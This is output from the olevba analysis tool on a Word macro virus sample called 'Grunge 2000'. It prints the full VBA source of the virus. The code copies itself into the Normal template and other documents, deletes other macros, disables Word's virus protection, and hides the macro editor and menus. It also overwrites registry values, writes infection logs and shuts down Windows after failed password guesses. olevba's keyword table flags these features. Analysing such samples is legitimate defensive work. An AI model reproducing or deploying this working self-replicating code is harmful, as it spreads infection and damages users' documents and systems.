olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Titasic.o-2c8d64f9c8fba8789dd10ed71dada05baaf0c61e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Titasic.o-2c8d64f9c8fba8789dd10ed71dada05baaf0c61e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO GrungeStill.frm 
in file: Virus.MSWord.Titasic.o-2c8d64f9c8fba8789dd10ed71dada05baaf0c61e - OLE stream: 'Macros/VBA/GrungeStill'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 






























Private Sub CmdOK_Click()
On Error Resume Next
Unload Me
End Sub
Private Sub UserForm_Layout()
On Error Resume Next
If (WeekDay(Date) = vbMonday) Or (WeekDay(Date) = vbSaturday) Then
    LblInfo.Caption = Chr(13) & "I'm not like them ,But I can pretend" & Chr(13) & _
                      "The sun is gone, But I have a light" & Chr(13) & _
                      "The day is gone, I'm having fun." & Chr(13) & Chr(13) & _
                      "Lyrics 'DUMB' by Kurt Cobain."
    Me.Height = 182.25
Else
    Me.Height = 95.25
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO GrungeKill.bas 
in file: Virus.MSWord.Titasic.o-2c8d64f9c8fba8789dd10ed71dada05baaf0c61e - OLE stream: 'Macros/VBA/GrungeKill'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'*********************************************************
'*            Copyright By GRUNGE Family 2000            *
'*        Begin 10, Nov 2000, Bandung - Indonesia        *
'*                 Grunge Version-2000                   *
'*********************************************************
Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Public CekPas As Byte, Benar As Boolean
Public Const OpWord = "I Hate EveryBody If EveryBody Not Like Me"
Public Const ClWord = "The Sun Is Gone But I Have A Light", MG2 = "Macro$oft Grunge2000"
Public Const TMac = "Grunge protection on your document, please don't try again..."
Sub GrungeBersih(theObject As Object)
On Error Resume Next
For i = 1 To Application.VBE.VBProjects.Count
For Each NamaMAc In theObject.VBProject.VBComponents
If NamaMAc.Name <> "GrungeStill" And NamaMAc.Name <> "GrungeKill" And NamaMAc.Name <> "ThisDocument" Then
    Application.OrganizerDelete Source:=theObject.FullName, Name:=NamaMAc.Name, Object:=wdOrganizerObjectProjectItems
    Application.VBE.VBProjects.Item(NamaMAc).VBComponents.Remove NamaMAc
    Application.Caption = "Clean on Macro : " & NamaMAc.Name
End If
If NamaMAc.Name = "ThisDocumet" Then
   With remto.CodeModule
       .DeleteLines 1, .CountOfLines
   End With
End If
Next NamaMAc
Next i
End Sub
Sub SalinDocToTemp(CopyDari As Object, CopyKe As Object)
On Error Resume Next
Dim ATemp As Template
For Each ATemp In Templates
   Application.OrganizerCopy Source:=CopyDari.FullName, _
   Destination:=CopyKe.FullName, Name:="GrungeStill", Object:=wdOrganizerObjectProjectItems
   Application.OrganizerCopy Source:=CopyDari.FullName, _
   Destination:=CopyKe.FullName, Name:="GrungeKill", Object:=wdOrganizerObjectProjectItems
Next ATemp
End Sub
Sub PanggilDoc()
On Error Resume Next
With Application
    SalinDocToTemp .ActiveDocument, .NormalTemplate
    .NormalTemplate.Save
End With
End Sub
Sub PanggilTemp()
On Error Resume Next
With Application
    SalinDocToTemp .NormalTemplate, .ActiveDocument
    .NormalTemplate.Save
End With
End Sub
Sub FileSave()
On Error Resume Next
CapWord "Saving Grunge2000, please wait...", 33
Saving
Documents.Save
End Sub
Sub AutoSave()
FileSave
End Sub
Sub AutoOpen()
On Error Resume Next
GrungeBersih ActiveDocument
GrungeCek
SalinKemana
GrungeSave
For i = 1 To 10: Application.CommandBars.Item(i).Protection = msoBarNoCustomize: Next i
End Sub
Sub FileOpen()
On Error Resume Next
CapWord MG2, 20
If Dialogs(wdDialogFileOpen).Show <> 0 Then
   AutoOpen
End If
CapWord OpWord, Len(OpWord)
GrungeSave
End Sub
Sub AutoClose()
On Error Resume Next
SalinKemana
CapWord MG2, 20
If ActiveDocument.Saved = True Then ActiveDocument.Save
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Grunge": System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "Make Your Computer Dead..."
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "s1159") = "Grunge": System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "s2359") = "Grunge": System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "sTimeFormat") = "HH:mm:ss tt"
PathFile = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
MkDir (PathFile & "\Grunge Family")
Open PathFile & "\Grunge Family\" & Application.ActiveDocument.Name & ".ini" For Output As #1
 Print #1, "[Grunge Family Infected in Your Document]": Print #1, "=========================================": Print #1, "Date infected    : " & Format(Date, "DDDD, DD-MMMM-YYYY")
 Print #1, "Time infected    : " & Format(Time, "HH-MM-SS AMPM"): Print #1, "User Name        : " & UserName: Print #1, "FileName         : " & ActiveDocument.FullName: Print #1, "": Print #1, "Copyright by Grunge Viruses Version Grunge-D"
Close #1
End Sub
Sub AutoExit()
On Error Resume Next
If (WeekDay(Date) = vbTuesday) Or (WeekDay(Date) = vbFriday) Or (WeekDay(Date) = vbSunday) Then
On Error GoTo Salah
    GrungeStill.Show
    CapWord ClWord, Len(ClWord)
    Exit Sub
Salah:
    MsgBox OpWord, 16, MG2
    CapWord ClWord, Len(ClWord)
End If
End Sub
Sub viewvbcode()
ToolsMacro
End Sub
Sub ToggleFormsDesign()
ToolsMacro
End Sub
Sub viewcode()
ToolsMacro
End Sub
Sub FileClose()
On Error Resume Next
AutoClose
Application.ActiveDocument.Close
End Sub
Sub FileNewDefault()
On Error Resume Next
CapWord "Anyar Macro$oft Grunge2000", 24
WordBasic.FileNewDefault
SalinKemana
End Sub
Sub FileExit()
AutoClose
End Sub
Sub FileNew()
On Error Resume Next
If Dialogs(wdDialogToolsTemplates).Show <> 0 Then SalinKemana
End Sub
Sub HelpAbout()
Dim H
H = InputBox("I Hate EveryBody If EveryBody Not Like Me", "Grunge2000 Still A Live", "Kurt Cobain")
If H = "/\/\" Then
   WordBasic.DisableAutoMacros False
    Application.ShowVisualBasicEditor = True
    Else
        CekPas = CekPas + 1
        MsgBox "Anda memasukan Password salah, bila anda mencoba lagi maka" & Chr(13) & _
               "saya akan mematikan komputer ini,........??????", 16, "GRUNGE PASSWORD"
        If CekPas = 3 Then
           MsgBox "I Hate EveryBody If EveryBody Not Like Me, I Kill You Now........", 48, "Grunge2000 Warning !"
           ExitWindowsEx 1, 0
        End If
End If
End Sub
Sub ToolsMacro()
On Error Resume Next
Saving
GrungeStill.Show
CapWord TMac, Len(TMac)
Exit Sub
End Sub
Sub GrungeCek()
On Error Resume Next
Application.Options.VirusProtection = False
WordBasic.DisableAutoMacros False: Application.ShowVisualBasicEditor = False
ActiveDocument.CommandBars.Item(9).Enabled = False: ActiveDocument.CommandBars.Item(29).Enabled = False
UserName = "Grunge Still A Live": UserInitials = "Grunge": UserAddress = "www.Grunge-X.com"
End Sub
Sub AutoExec()
On Error Resume Next
GrungeSave
WordBasic.DisableAutoMacros True: Application.ShowVisualBasicEditor = False

End Sub
Sub CapWord(Nm As String, Pan As Integer)
On Error Resume Next
Application.Caption = ""
For i = 1 To Pan
  For K = 1 To 30000
  Next K
    Application.Caption = Mid$(Nm, 1, i)
Next i
End Sub
Sub Saving()
On Error Resume Next
With Application
   GrungeBersih .ActiveDocument
   GrungeBersih .NormalTemplate
   SalinKemana
   .ActiveDocument.Save
   .NormalTemplate.Save
   CapWord MG2, 20
End With
End Sub
Sub GrungeSave()
   Application.OnTime Now + TimeValue("00:00:04"), Name:="SalinKemana"
   Application.OnTime Now + TimeValue("00:00:05"), Name:="Saving"
End Sub
Sub SalinKemana()
Dim MacCek As Boolean
MacCek = False
For Each NamaMAc In NormalTemplate.VBProject.VBComponents
If NamaMAc.Name = "GrungeKill" Then
   MacCek = True
End If
Next NamaMAc
If MacCek = False Then
   PanggilDoc
   Else
   PanggilTemp
End If
End Sub






-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.o-2c8d64f9c8fba8789dd10ed71dada05baaf0c61e' - OLE stream: 'Macros/GrungeStill/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.o-2c8d64f9c8fba8789dd10ed71dada05baaf0c61e' - OLE stream: 'Macros/GrungeStill/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Grunge 2000
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.o-2c8d64f9c8fba8789dd10ed71dada05baaf0c61e' - OLE stream: 'Macros/GrungeStill/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.o-2c8d64f9c8fba8789dd10ed71dada05baaf0c61e' - OLE stream: 'Macros/GrungeStill/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Grunge@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.o-2c8d64f9c8fba8789dd10ed71dada05baaf0c61e' - OLE stream: 'Macros/GrungeStill/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial Narrow
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.o-2c8d64f9c8fba8789dd10ed71dada05baaf0c61e' - OLE stream: 'Macros/GrungeStill/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I Hate EveryBody If everyBody Not Like Me.F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.o-2c8d64f9c8fba8789dd10ed71dada05baaf0c61e' - OLE stream: 'Macros/GrungeStill/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.o-2c8d64f9c8fba8789dd10ed71dada05baaf0c61e' - OLE stream: 'Macros/GrungeStill/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Titasic.o-2c8d64f9c8fba8789dd10ed71dada05baaf0c61e' - OLE stream: 'Macros/GrungeStill'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Titasic.o-2c8d64f9c8fba8789dd10ed71dada05baaf0c61e' - OLE stream: 'Macros/GrungeStill'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CmdOK'" IN 'Virus.MSWord.Titasic.o-2c8d64f9c8fba8789dd10ed71dada05baaf0c61e' - OLE stream: 'Macros/GrungeStill'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Titasic.o-2c8d64f9c8fba8789dd10ed71dada05baaf0c61e' - OLE stream: 'Macros/GrungeStill'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'LblInfo'" IN 'Virus.MSWord.Titasic.o-2c8d64f9c8fba8789dd10ed71dada05baaf0c61e' - OLE stream: 'Macros/GrungeStill'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CmdOK_Click         |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |UserForm_Layout     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+
